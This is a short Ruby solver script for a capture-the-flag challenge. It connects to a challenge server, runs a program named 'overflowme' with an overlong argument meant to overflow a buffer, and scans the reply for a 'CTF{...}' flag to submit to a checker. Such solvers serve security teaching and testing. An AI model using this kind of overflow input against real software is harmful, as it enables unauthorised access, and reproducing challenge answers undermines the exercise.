require 'socket'
require './libronsolve.rb'

s = TCPSocket.new(*get_host_port())
sleep(1)
s.write("./overflowme aaaaaaaahacked\nexit\n")

out = ''
loop do
  data = s.recv(100)

  if data.empty?
    break
  end

  out = out + data
end

for line in out.split(/\n/)
  if line =~ /(CTF{.*})/
    check_flag($1, terminate: true)
  end
end

puts "Failed to get a flag:"
puts
puts out
